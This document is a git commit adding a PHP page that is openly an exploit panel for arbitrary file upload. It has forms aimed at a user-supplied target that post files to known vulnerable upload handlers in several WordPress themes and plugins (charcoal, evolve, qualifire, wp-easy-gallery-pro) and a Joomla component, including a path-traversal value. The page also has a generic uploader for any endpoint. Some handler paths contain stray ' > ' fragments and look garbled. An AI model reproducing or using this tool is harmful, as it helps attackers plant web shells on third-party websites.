79a14d98c5281a2c2f35782942a4d2dbe190f52f
sinkaroid <bibsindra@gmail.com>
2019-01-25 18:34:15 +0700

    Create memek.php

---
+++ memek.php
@@ -0,0 +1,193 @@
+
+<html><head>
+<title>Hidden Memek</title> 
+
+<meta name="robots" content="index, follow"> 
+<link rel="SHORTCUT ICON"   href="http://www.slemanboys.org/favicon.ico"/> 
+<meta name="description" content="Memek" />  
+<meta name="googlebot" content="index,follow" /> 
+ <meta name="robots" content="all" /> 
+  <meta name="robots schedule" content="auto" /> 
+  <meta name="distribution" content="global" /> 
+  <base target='_blank'/> 
+</head> 
+
+<body>
+<form method="post">
+	
+	<center>
+	<pre> 
+	<br>
+[<input type="text" name="url" size="50" height="10" placeholder="fullurl ex: https://memekshop/js/webforms/upload/index.php" style="margin: 5px auto; padding-left: 5px;" required>]<br>
+[<input type="text" name="pf" size="20" height="10" placeholder="array ex:/files[]/qqfile/" style="margin: 5px auto; padding-left: 5px;" required>]<br>
+<input type="submit" name="d" value="LOCK">
+</center>
+</form>
+<script src="//code.jquery.com/jquery-1.10.2.js"></script>
+<link href="http://fonts.googleapis.com/css?family=New+Rocker" rel="stylesheet">
+	<script src="jquery.backstretch.min.js"></script>
+
+<?php
+@ini_set('output_buffering',0); 
+@ini_set('display_errors', 0);
+$url = $_POST['url'];
+$pf = $_POST['pf'];
+$d = $_POST['d'];
+if($d) {
+	echo "<br><center><form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='pencet'></form";
+}
+?>
+</form>
+<br><br><br>
+
+</div><div id="hide"></div></div></div>
+<center>
+	<br><br>
+--------------------
+<br>charcoal Exploit<br>
+--------------------<br>
+<?php
+
+$self = $_SERVER["PHP_SELF"];
+
+echo 'Target';
+echo "<form action=\"$self\" method=\"GET\"><input type=\"text\" name=\"url\" value=\"http://\">
+<input type=\"submit\" value=\"Show Target\"></form>";
+if(!isset($_GET['url'])){
+$url = "";
+}else
+{
+$url = $_GET['url'];
+}
+?>
+<?php echo "Target is : $url"; ?>
+<br>
+<br>
+<form enctype="multipart/form-data"
+action="<?php echo "$url"; ?>/wp-content/themes/charcoal/functions/ > -handler.php" method="post" target="_blank">
+<input name=" > file" type="file"/><br />
+<input type="submit" value=" > " />
+</form>  
+</div>
+
+<div id="kiri" align="center">
+----------------------------------
+<br>com_simplephotogallery Exploit<br>
+----------------------------------<br>
+<?php
+
+$self = $_SERVER["PHP_SELF"];
+
+echo 'Target';
+echo "<form action=\"$self\" method=\"GET\"><input type=\"text\" name=\"url1\" value=\"http://\">
+<input type=\"submit\" value=\"Show Target\"></form>";
+if(!isset($_GET['url1'])){
+$url1 = "";
+}else
+{
+$url1 = $_GET['url1'];
+}
+?>
+<?php echo "Target is : $url1"; ?>
+<form method="POST" action="<?php echo "$url1"; ?>/administrator/components/com_simplephotogallery/lib/ > File.php" target="_blank" enctype="multipart/form-data" >
+    <input type="file" name=" > file">
+    <input type="hidden" name="jpath" value="..%2F..%2F..%2F..%2F" >
+    <input type="submit" name="Submit" value=" > ">
+</form>
+</body>
+</html></div>
+
+
+-------------------------
+<div id="kiri" align="center">
+easy-gallery-pro Exploit<br>
+-------------------------<br>
+<?php
+
+$self = $_SERVER["PHP_SELF"];
+
+echo 'target<br>';
+echo "<form action=\"$self\" method=\"GET\"><input type=\"text\" name=\"url2\" value=\"http://\">
+<input type=\"submit\" value=\"Show Target\"></form>";
+if(!isset($_GET['url2'])){
+$url2 = "";
+}else
+{
+$url2 = $_GET['url2'];
+}
+
+
+echo "Target is: $url2";
+echo"<br><br><form method=\"POST\" action=\"$url2/wp-content/plugins/wp-easy-gallery-pro/admin/php.php\" target=\"_blank\" enctype=\"multipart/form-data\" >
+<input type=\"jpg\" name=\"url\" value=\"./\" />
+<input name=\"qqfile\" type=\"file\" />
+<input type=\"submit\" value=\" > \" />
+</form>
+<br>
+</div>
+<div id=\"kiri\" align=\"center\">
+<br> evolve Exploit<br>";
+echo "<form action=\"$self\" method=\"GET\"><input type=\"text\" name=\"url2a\" value=\"http://\">
+<input type=\"submit\" value=\"Show Target\"></form>";
+if(!isset($_GET['url2a'])){
+$url2a = "";
+}else
+{
+$url2a = $_GET['url2a'];
+}
+echo "Target is: $url2a";
+echo "<br><br><form method=\"POST\" action=\"$url2a/wp-content/themes/evolve/js/back-end/libraries/file > er/ > _handler.php\" target=\"_blank\" enctype=\"multipart/form-data\">
+<input type=\"jpg\" name=\"url\" value=\"./\" />
+<input name=\"qqfile\" type=\"file\" />
+<input type=\"submit\" value=\" > \" />
+</form>";
+?></div>
+
+
+<div align="center">
+<?php
+
+$self = $_SERVER["PHP_SELF"];
+
+echo 'qualifire Exploit<br><br>Target';
+echo "<form action=\"$self\" method=\"GET\"><input type=\"text\" name=\"url5\" value=\"http://\">
+<br><input type=\"submit\" value=\"Show Target\"></form>";
+if(!isset($_GET['url5'])){
+$url5 = "";
+}else
+{
+$url5 = $_GET['url5'];
+}
+?>
+<?php echo "Target is : $url5"; ?>
+<br>
+<form
+action="<?php echo "$url5"; ?>/wp-content/themes/qualifire/scripts/admin/ > ify/ > ify.php"
+method="post" target="_blank" enctype="multipart/form-data">
+<label for="file">Filename:</label>
+<input type="file" name="Filedata" ><br>
+<input type="submit" name="submit" value="Submit">
+</form>
+</div>
+<br><br><br><BR><BR><BR>
+<script src="//code.jquery.com/jquery-1.10.2.js"></script>
+<link href="http://fonts.googleapis.com/css?family=New+Rocker" rel="stylesheet">
+
+<?php
+@ini_set('output_buffering',0); 
+@ini_set('display_errors', 0);
+$url = $_POST['url'];
+$pf = $_POST['pf'];
+$d = $_POST['d'];
+if($d) {
+	echo "<br><center><form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='pencet'></form";
+}
+?>
+</form>
+<br><br><br>
+
+
+
+</body>
+</html>
+
